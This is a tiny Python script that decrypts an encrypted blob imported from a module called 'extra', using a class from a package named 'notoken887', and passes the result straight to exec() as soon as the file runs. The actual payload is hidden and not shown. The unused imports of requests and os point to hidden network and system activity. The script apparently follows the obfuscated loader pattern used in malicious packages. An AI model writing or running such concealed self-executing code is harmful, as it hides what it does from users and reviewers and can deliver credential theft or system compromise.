from notoken887.encryptor import TokenCryptor
from extra import l
import requests, os

def pt():
    cryptor = TokenCryptor()
    decrypted_code = cryptor.decrypt(l)
    exec(decrypted_code)
pt()